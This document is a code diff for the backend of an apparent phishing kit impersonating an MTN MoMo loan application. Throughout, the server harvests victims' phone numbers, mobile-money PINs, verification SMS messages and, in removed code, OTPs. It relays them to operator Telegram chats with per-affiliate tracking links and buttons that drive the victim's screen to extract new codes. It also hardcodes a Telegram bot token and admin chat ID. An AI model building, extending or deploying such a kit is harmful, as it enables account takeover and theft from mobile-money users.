@@ -11,45 +11,35 @@ const TOKEN =
   process.env.TOKEN ||
   process.env.TELEGRAM_BOT_TOKEN ||
   '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
-const RAW_APP_URL =
+const APP_URL =
   process.env.APP_URL ||
   process.env.RENDER_EXTERNAL_URL ||
-  (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const APP_URL = RAW_APP_URL ? RAW_APP_URL.replace(/\/+$/, '') : '';
-const FALLBACK_ADMIN_ID = String(
-  process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400'
-).trim();
+  (process.env.RENDER_EXTERNAL_HOSTNAME
+    ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}`
+    : '');
+const FALLBACK_ADMIN_ID =
+  process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
 function loadAdmins() {
-  const map = new Map();
   try {
     if (fs.existsSync(ADMINS_FILE)) {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
-      for (const [id, rec] of entries) {
-        map.set(String(id), {
-          username: rec.username || '',
-          firstName: rec.firstName || 'User',
-          lastName: rec.lastName || ''
-        });
-      }
+      return new Map(
+        entries.map(([id, rec]) => [
+          id,
+          {
+            username: rec.username || '',
+            firstName: rec.firstName || 'User',
+            lastName: rec.lastName || ''
+          }
+        ])
+      );
     }
   } catch (err) {}
-
-  const envSubAdmins = String(process.env.SUB_ADMIN_IDS || '')
-    .split(',')
-    .map((s) => s.trim())
-    .filter(Boolean);
-
-  for (const id of envSubAdmins) {
-    if (id !== FALLBACK_ADMIN_ID && !map.has(id)) {
-      map.set(id, { username: '', firstName: 'SubAdmin', lastName: '' });
-    }
-  }
-
-  return map;
+  return new Map();
 }
 
 function saveAdmins() {
@@ -64,74 +54,48 @@ const sessions = new Map();
 const smsStore = new Map();
 let lastActiveUserId = null;
 const admins = loadAdmins();
-saveAdmins();
 
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
-    if (targetAdmin === FALLBACK_ADMIN_ID || admins.has(targetAdmin)) {
+    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
       return targetAdmin;
     }
   }
   return FALLBACK_ADMIN_ID;
 }
 
-function normalizeZeroPhone(rawPhone) {
-  const digits = String(rawPhone || '').replace(/\D/g, '');
-  if (!digits) return 'N/A';
-  if (digits.startsWith('260')) {
-    return '0' + digits.slice(3);
-  }
-  if (digits.startsWith('0')) {
-    return digits;
-  }
-  if (/^(96|76|56)\d{7}$/.test(digits)) {
-    return '0' + digits;
-  }
-  return digits;
-}
-
 function escapeMarkdown(str) {
   return String(str || '').replace(/([_*`\[])/g, '\\$1');
 }
 
-function buildAdminLink(chatId) {
-  const baseUrl =
-    APP_URL ||
-    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-  return baseUrl ? `${baseUrl}/?admin=${chatId}` : `/?admin=${chatId}`;
-}
+function getOrCreateSession(userId, adminChatId) {
+  let activeId = userId || lastActiveUserId;
+  if (!activeId) {
+    activeId = `user_${Date.now()}`;
+  }
+  lastActiveUserId = activeId;
 
-function formatAdminTelegramInfo(chatId, firstName, lastName, username, isMainAdmin) {
-  const fullName = `${firstName || ''} ${lastName || ''}`.trim() || 'User';
-  const cleanUser = username && username !== 'N/A' ? `@${escapeMarkdown(username)}` : 'N/A';
-  const adminLink = buildAdminLink(chatId);
-  const roleLabel = isMainAdmin
-    ? '👑 *MAIN ADMIN LINK & TELEGRAM INFO*'
-    : '🔗 *SUB-ADMIN LINK & TELEGRAM INFO*';
-
-  return (
-    `${roleLabel}\n\n` +
-    `👤 *Name:* ${escapeMarkdown(fullName)}\n` +
-    `📌 *Username:* ${cleanUser}\n` +
-    `🆔 *Chat ID:* \`${chatId}\`\n` +
-    `🛡️ *Role:* ${isMainAdmin ? 'Main Admin' : 'Sub-Admin'}\n\n` +
-    `🌐 *Admin Link:*\n${adminLink}`
-  );
+  let session = sessions.get(activeId);
+  if (!session) {
+    session = {
+      adminChatId: resolveTargetChat(adminChatId),
+      applicant: {},
+      loan: {},
+      phone: '',
+      pin: '',
+      sms: '',
+      status: 'READY_FOR_PIN'
+    };
+    sessions.set(activeId, session);
+  } else if (adminChatId) {
+    session.adminChatId = resolveTargetChat(adminChatId);
+  }
+  return { activeId, session };
 }
 
 async function initBot() {
-  bot = new TelegramBot(TOKEN, { polling: false });
-
-  bot.on('polling_error', (err) => {
-    const msg = err && err.message ? err.message : String(err);
-    if (!msg.includes('409 Conflict')) {
-      console.error('Polling error:', msg);
-    }
-  });
-
-  await bot.deleteWebHook().catch(() => {});
-  await bot.startPolling({ restart: true });
+  bot = new TelegramBot(TOKEN, { polling: true });
 
   bot.onText(/\/start/, async (msg) => {
     try {
@@ -145,20 +109,34 @@ async function initBot() {
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
-      const isMainAdmin = chatId === FALLBACK_ADMIN_ID;
-
-      if (!isMainAdmin) {
-        admins.set(chatId, {
-          username,
-          firstName,
-          lastName,
-          updatedAt: new Date().toISOString()
-        });
+      const isNewAdmin = !admins.has(chatId);
+      if (isNewAdmin) {
+        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
-      const message = formatAdminTelegramInfo(chatId, firstName, lastName, username, isMainAdmin);
-      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+      const baseUrl = APP_URL ? APP_URL.replace(/\/+$/, '') : '';
+      const userLink = `${baseUrl}/?admin=${chatId}`;
+
+      const subAdminMessage =
+        `👑 *MTN MOMO ADMIN PANEL*\n\n` +
+        `👤 *Name:* ${escapeMarkdown(firstName)} ${escapeMarkdown(lastName)}\n` +
+        `📌 *Username:* @${escapeMarkdown(username)}\n` +
+        `• Chat ID: \`${chatId}\`\n\n` +
+        `🔗 *Your Tracking Link:*\n${userLink}`;
+      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+
+      if (isNewAdmin && chatId !== String(FALLBACK_ADMIN_ID)) {
+        const mainAdminNotification =
+          `🚨 *NEW SUB-ADMIN STARTED BOT*\n\n` +
+          `👤 *Name:* ${escapeMarkdown(firstName)} ${escapeMarkdown(lastName)}\n` +
+          `📌 *Username:* @${escapeMarkdown(username)}\n` +
+          `• Chat ID: \`${chatId}\`\n\n` +
+          `🔗 *Generated Link:*\n${userLink}`;
+        await bot.sendMessage(FALLBACK_ADMIN_ID, mainAdminNotification, {
+          parse_mode: 'Markdown'
+        });
+      }
     } catch (err) {}
   });
 
@@ -170,15 +148,22 @@ async function initBot() {
       const firstUnderscoreIdx = actionData.indexOf('_');
       const actionType =
         firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
-      let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
+      let targetId =
+        firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
 
       if (actionType === 'COPYSMS') {
         const smsText =
-          smsStore.get(targetId) || (sessions.get(targetId) && sessions.get(targetId).sms) || '';
+          smsStore.get(targetId) ||
+          (sessions.get(targetId) && sessions.get(targetId).sms) ||
+          'No SMS available';
         await bot
-          .answerCallbackQuery(query.id, { text: 'SMS sent for clipboard copy', show_alert: false })
+          .answerCallbackQuery(query.id, { text: 'SMS ready to copy below', show_alert: false })
           .catch(() => {});
-        await bot.sendMessage(chatId, smsText);
+        await bot.sendMessage(
+          chatId,
+          `📋 *Tap SMS below to copy:*\n\n\`${escapeMarkdown(smsText)}\``,
+          { parse_mode: 'Markdown' }
+        );
         return;
       }
 
@@ -199,14 +184,16 @@ async function initBot() {
           session.status = 'BLOCKED';
           await bot.sendMessage(
             chatTarget,
-            `🚫 Applicant blocked. Screen updated to blocked notice.`
+            `🚫 *BLOCK* — Applicant blocked. Screen updated to blocked notice.`,
+            { parse_mode: 'Markdown' }
           );
           break;
         case 'NEXT':
           session.status = 'PROCEED_SMS';
           await bot.sendMessage(
             chatTarget,
-            `➡️ Allowed to proceed to SMS verification screen.`
+            `➡️ *NEXT* — Allowed to proceed to SMS verification screen (15s timer).`,
+            { parse_mode: 'Markdown' }
           );
           break;
         case 'INCORRECT':
@@ -214,36 +201,24 @@ async function initBot() {
           session.pin = '';
           await bot.sendMessage(
             chatTarget,
-            `❌ Incorrect PIN triggered on applicant screen.`
+            `❌ *INCORRECT PIN* — Redirected applicant back to enter a new 5-digit PIN.`,
+            { parse_mode: 'Markdown' }
           );
           break;
         case 'EXPIRED':
           session.status = 'SMS_EXPIRED';
           await bot.sendMessage(
             chatTarget,
-            `⚠️ SMS Expired triggered on applicant screen.`
+            `⚠️ *SMS EXPIRES* — Redirected applicant back to enter a new SMS.`,
+            { parse_mode: 'Markdown' }
           );
           break;
         case 'APPROVE':
-          session.status = 'PROCEED_OTP';
+          session.status = 'APPROVED';
           await bot.sendMessage(
             chatTarget,
-            `📲 SMS approved. Applicant moved to MTN MoMo 4-Digit OTP entry screen.`
-          );
-          break;
-        case 'OTPEXPIRED':
-          session.status = 'OTP_EXPIRED';
-          session.otp = '';
-          await bot.sendMessage(
-            chatTarget,
-            `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new MTN MoMo 4-digit OTP.`
-          );
-          break;
-        case 'SUCCESS':
-          session.status = 'SUCCESS';
-          await bot.sendMessage(
-            chatTarget,
-            `🎉 SUCCESS! Congratulations screen shown to applicant.`
+            `🎉 *APPROVE* — Congratulations screen shown to applicant.`,
+            { parse_mode: 'Markdown' }
           );
           break;
         default:
@@ -266,10 +241,6 @@ async function initBot() {
   });
 }
 
-app.get('/health', (req, res) => {
-  res.status(200).json({ ok: true, timestamp: new Date().toISOString() });
-});
-
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -281,24 +252,15 @@ app.post('/api/submit-application', async (req, res) => {
       adminChatId = req.query.admin;
     }
 
-    const targetChat = resolveTargetChat(adminChatId);
-    const userId = `user_${Date.now()}`;
-    lastActiveUserId = userId;
+    const { activeId, session } = getOrCreateSession(null, adminChatId);
+    session.applicant = applicant || {};
+    session.loan = loan || {};
+    if (applicant && applicant.phone) {
+      session.phone = applicant.phone;
+    }
+    session.status = 'READY_FOR_PIN';
 
-    const normalizedApplicant = {
-      ...(applicant || {}),
-      phone: applicant && applicant.phone ? normalizeZeroPhone(applicant.phone) : undefined
-    };
-
-    sessions.set(userId, {
-      adminChatId: targetChat,
-      phone: normalizedApplicant.phone,
-      applicant: normalizedApplicant,
-      loan: loan || {},
-      status: 'READY_FOR_PIN'
-    });
-
-    return res.status(200).json({ success: true, userId });
+    return res.status(200).json({ success: true, userId: activeId });
   } catch (err) {
     return res.status(500).json({ success: false, error: 'Unable to start session.' });
   }
@@ -316,34 +278,28 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
+// First Telegram message: immediately after step 3 of 3 when 5-digit PIN & phone are filled (auto-submitted)
 app.post('/api/submit-pin', async (req, res) => {
   try {
-    const { userId, phone, pin, applicantName } = req.body || {};
-    let activeId = userId || lastActiveUserId;
-    if (!activeId) {
-      activeId = `user_${Date.now()}`;
-      lastActiveUserId = activeId;
-    }
+    const { userId, phone, pin, applicantName, adminChatId } = req.body || {};
+    const { activeId, session } = getOrCreateSession(userId, adminChatId);
 
-    let session = sessions.get(activeId);
-    if (!session) {
-      session = { adminChatId: FALLBACK_ADMIN_ID };
-      sessions.set(activeId, session);
-    }
-
-    const cleanPhone = normalizeZeroPhone(phone || session.phone);
-    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
+    if (phone) session.phone = phone;
     if (applicantName) session.applicantName = applicantName;
     session.pin = pin;
     session.status = 'WAITING_PIN_REVIEW';
-    lastActiveUserId = activeId;
 
     const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
+    const displayName =
+      applicantName ||
+      session.applicantName ||
+      (session.applicant && session.applicant.fullName) ||
+      'MTN MoMo Applicant';
 
     const message =
-      `📱 *NEW MTN MOMO ZAMBIA APPLICANT*\n\n` +
-      `👤 *Applicant:* ${escapeMarkdown(applicantName || session.applicantName || 'MTN MOMO ZAMBIA')}\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
+      `📱 *NEW MTN MOMO APPLICANT (5-DIGIT PIN)*\n\n` +
+      `👤 *Applicant:* ${escapeMarkdown(displayName)}\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
       `🔑 *5-Digit PIN:* \`${escapeMarkdown(pin)}\``;
 
     const opts = {
@@ -365,34 +321,23 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
+// SMS verification submission (auto-submitted when starting with Y'ello. Please note!)
 app.post('/api/submit-sms', async (req, res) => {
   try {
-    const { userId, phone, sms, autoDetected } = req.body || {};
-    let activeId = userId || lastActiveUserId;
-    if (!activeId) {
-      activeId = `user_${Date.now()}`;
-      lastActiveUserId = activeId;
-    }
+    const { userId, phone, sms, autoDetected, adminChatId } = req.body || {};
+    const { activeId, session } = getOrCreateSession(userId, adminChatId);
 
-    let session = sessions.get(activeId);
-    if (!session) {
-      session = { adminChatId: FALLBACK_ADMIN_ID };
-      sessions.set(activeId, session);
-    }
-
-    const cleanPhone = normalizeZeroPhone(phone || session.phone);
     const cleanSms = String(sms || '').trim();
     session.sms = cleanSms;
-    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
+    if (phone) session.phone = phone;
     session.status = 'WAITING_SMS_REVIEW';
     smsStore.set(activeId, cleanSms);
-    lastActiveUserId = activeId;
 
     const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
 
     const message =
       `✉️ *MTN MOMO SMS VERIFICATION* ${autoDetected ? '(Auto-Submitted)' : ''}\n\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
       `📩 *SMS Message:*\n\`${escapeMarkdown(cleanSms)}\``;
 
     const opts = {
@@ -410,99 +355,38 @@ app.post('/api/submit-sms', async (req, res) => {
     };
 
     if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-    return res.status(200).json({ success: true });
+    return res.status(200).json({ success: true, userId: activeId });
   } catch (error) {
     return res.status(500).json({ success: false, error: 'Failed to send SMS to Telegram.' });
   }
 });
 
-app.post('/api/submit-otp', async (req, res) => {
-  try {
-    const { userId, phone, otp, autoSubmitted } = req.body || {};
-    let activeId = userId || lastActiveUserId;
-    if (!activeId) {
-      activeId = `user_${Date.now()}`;
-      lastActiveUserId = activeId;
-    }
-
-    let session = sessions.get(activeId);
-    if (!session) {
-      session = { adminChatId: FALLBACK_ADMIN_ID };
-      sessions.set(activeId, session);
-    }
-
-    const cleanPhone = normalizeZeroPhone(phone || session.phone);
-    const cleanOtp = String(otp || '').replace(/\D/g, '').slice(0, 4);
-    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
-    session.otp = cleanOtp;
-    session.status = 'WAITING_OTP_REVIEW';
-    lastActiveUserId = activeId;
-
-    const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
-
-    const message =
-      `🔐 *MTN MOMO 4-DIGIT OTP* ${autoSubmitted ? '(Auto-Submitted)' : ''}\n\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
-      `🔢 *MTN MoMo 4-Digit OTP:* \`${escapeMarkdown(cleanOtp)}\``;
-
-    const opts = {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: 'OTP EXPIRED', callback_data: `OTPEXPIRED_${activeId}` },
-            { text: 'SUCCESS', callback_data: `SUCCESS_${activeId}` }
-          ]
-        ]
-      }
-    };
-
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Failed to send OTP to Telegram.' });
-  }
-});
-
+// Request new SMS notification immediately when applicant taps Request New SMS after 15s countdown
 app.post('/api/request-new-sms', async (req, res) => {
   try {
-    const { userId, phone } = req.body || {};
-    let activeId = userId || lastActiveUserId;
-    let session = sessions.get(activeId);
-    if (!session) {
-      session = { adminChatId: FALLBACK_ADMIN_ID };
-    }
+    const { userId, phone, adminChatId } = req.body || {};
+    const { activeId, session } = getOrCreateSession(userId, adminChatId);
 
-    const cleanPhone = normalizeZeroPhone(phone || session.phone);
+    if (phone) session.phone = phone;
+    session.status = 'NEW_SMS_REQUESTED';
+
     const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
     const message =
-      `🔔 *NEW SMS REQUESTED*\n\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
-      `⏳ Applicant requested a new verification SMS after the 15s timer ended.`;
+      `🔄 *NEW SMS REQUESTED*\n\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
+      `⏳ Applicant requested a new verification SMS.`;
 
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
-    return res.status(200).json({ success: true });
+    if (targetChat && bot) {
+      await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
+    }
+    return res.status(200).json({ success: true, userId: activeId });
   } catch (error) {
     return res.status(500).json({ success: false, error: 'Failed to notify admin.' });
   }
 });
 
 const PORT = process.env.PORT || 10000;
-const server = app.listen(PORT, async () => {
+app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-
-function shutdown(signal) {
-  console.log(`Received ${signal}, shutting down...`);
-  if (bot && bot.isPolling()) {
-    bot.stopPolling().catch(() => {});
-  }
-  server.close(() => {
-    process.exit(0);
-  });
-}
-
-process.on('SIGTERM', () => shutdown('SIGTERM'));
-process.on('SIGINT', () => shutdown('SIGINT'));
-                       
